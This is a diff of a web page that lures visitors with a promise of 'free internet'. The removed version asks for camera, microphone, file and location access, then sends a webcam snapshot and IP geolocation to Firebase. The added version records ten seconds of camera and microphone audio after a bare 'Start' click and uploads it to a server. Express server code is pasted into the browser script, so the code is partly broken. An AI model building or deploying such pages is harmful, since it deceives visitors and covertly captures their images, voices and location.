@@ -1,141 +1,134 @@
+<!-- index.html -->
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Internet gratis</title>
-  <style>
-    body {
-      background-color: #111;
-      color: #eee;
-      font-family: sans-serif;
-    }
-    .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-    .button {
-      background-color: #333;
-      color: #eee;
-      border: none;
-      padding: 10px 20px;
-      margin: 10px;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    .button:hover {
-      background-color: #555;
-    }
-    .logo {
-      width: 150px;
-      height: 150px;
-      margin-bottom: 20px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Internet free</title>
+    <style>
+       /* styles.css */
+body {
+  font-family: 'Open Sans', sans-serif;
+  background-color: #f7f7f7;
+  margin: 0;
+  padding: 0;
+}
+
+.container {
+  max-width: 800px;
+  margin: 40px auto;
+  padding: 20px;
+  background-color: #fff;
+  border: 1px solid #ddd;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+h1 {
+  font-weight: bold;
+  color: #333;
+  margin-top: 0;
+}
+
+#video {
+  width: 100%;
+  height: 480px;
+  border: none;
+  border-radius: 10px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+#start-button {
+  background-color: #4CAF50;
+  color: #fff;
+  padding: 10px 20px;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+}
+
+#start-button:hover {
+  background-color: #3e8e41;
+}
+
+#start-button:active {
+  background-color: #3e8e41;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+}
+    </style>
 </head>
 <body>
-  <div class="container">
-    <img width="48" height="48" src="https://img.icons8.com/fluency/48/internet.png" alt="internet"/>
-    <h1>Internet gratis</h1>
-    <h3>Para continuar otorgar algunos permisos </h3>
-    <button class="button" id="cameraButton">Acceder a la cámara</button>
-    <button class="button" id="microphoneButton">Acceder al micrófono</button>
-    <button class="button" id="fileButton">Elegir archivos</button>
-    <button class="button" id="getGeolocationButton">Obtener geolocalización</button>
-  </div>
+  <center>  <h1>Internet free</h1></center>
+    <video id="video" width="640" height="480"></video>
+  <center > <button id="start-button">Start</button></center>
+    <script>
+        // script.js
+const video = document.getElementById('video');
+const startButton = document.getElementById('start-button');
 
-  <script>
-    const firebaseConfig = {
-      apiKey: 'YOUR_API_KEY',
-      authDomain: 'YOUR_AUTH_DOMAIN',
-      projectId: 'YOUR_PROJECT_ID'
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
+startButton.addEventListener('click', async () => {
+    try {
+        // Request access to camera and microphone
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-    const cameraButton = document.getElementById('cameraButton');
-    const microphoneButton = document.getElementById('microphoneButton');
-    const fileButton = document.getElementById('fileButton');
-    const getGeolocationButton = document.getElementById('getGeolocationButton');
+        // Set the video source to the stream
+        video.srcObject = stream;
 
-    // Add geolocation function
-    function getGeolocation() {
-      fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-          console.log(`Geolocation: ${data.city}, ${data.region}, ${data.country}`);
-          return `${data.city}, ${data.region}, ${data.country}`;
-        })
-        .catch(err => {
-          console.error('Error getting geolocation:', err);
-          return null;
-        });
+        // Create a MediaRecorder instance
+        const mediaRecorder = new MediaRecorder(stream);
+
+        // Set up event listeners for the MediaRecorder
+        mediaRecorder.onstart = () => {
+            console.log('Recording started');
+        };
+
+        mediaRecorder.onstop = () => {
+            console.log('Recording stopped');
+        };
+
+        mediaRecorder.ondataavailable = (event) => {
+            // Send the recorded data to the server
+            const formData = new FormData();
+            formData.append('video', event.data);
+
+            fetch('/upload', {
+                method: 'POST',
+                body: formData
+            })
+            .then((response) => response.json())
+            .then((data) => console.log(data))
+            .catch((error) => console.error(error));
+        };
+
+        // Start recording
+        mediaRecorder.start();
+
+        // Stop recording after 10 seconds
+        setTimeout(() => {
+            mediaRecorder.stop();
+        }, 10000);
+    } catch (error) {
+        console.error('Error accessing camera and microphone:', error);
     }
+});
 
-    getGeolocationButton.addEventListener('click', () => {
-      getGeolocation();
-    });
+// server.js
+const express = require('express');
+const app = express();
+const multer = require('multer');
 
-    cameraButton.addEventListener('click', () => {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          const video = document.createElement('video');
-          video.srcObject = stream;
-          video.autoplay = true;
-          document.body.appendChild(video);
+const upload = multer({ dest: './uploads/' });
 
-          // Create a canvas to capture the image
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+app.post('/upload', upload.single('video'), (req, res) => {
+    // Save the uploaded video to the database
+    const videoBuffer = req.file.buffer;
+    // TO DO: implement database logic to store the video buffer
 
-          // Get the image data URL
-          const imageDataURL = canvas.toDataURL('image/jpeg');
+    res.json({ message: 'Video uploaded successfully' });
+});
 
-          // Save the image to Firebase database
-          db.collection('images').add({
-            image: imageDataURL,
-            geolocation: getGeolocation() // Call the geolocation function to get the current location
-          })
-          .then(docRef => {
-            console.log(`Image saved to Firebase database with ID: ${docRef.id}`);
-          })
-          .catch(err => {
-            console.error('Error saving image to Firebase database:', err);
-          });
-        })
-        .catch(err => {
-          console.error('Error accessing camera:', err);
-        });
-    });
-
-    microphoneButton.addEventListener('click', () => {
-      navigator.mediaDevices.getUserMedia({ audio: true })
-        .then(stream => {
-          const audio = document.createElement('audio');
-          audio.srcObject = stream;
-          audio.autoplay = true;
-          document.body.appendChild(audio);
-        })
-        .catch(err => {
-          console.error('Error accessing microphone:', err);
-        });
-    });
-
-    fileButton.addEventListener('click', () => {
-      const input = document.createElement('input');
-      input.type = 'file';
-      input.accept = '*/*';
-      input.click();
-
-      input.addEventListener('change', (event) => {
-        const file = event.target.files[0];
-        console.log(file.name);
-      });
-    });
-  </script>
+app.listen(3000, () => {
+    console.log('Server listening on port 3000');
+});
+    </script>
 </body>
 </html>
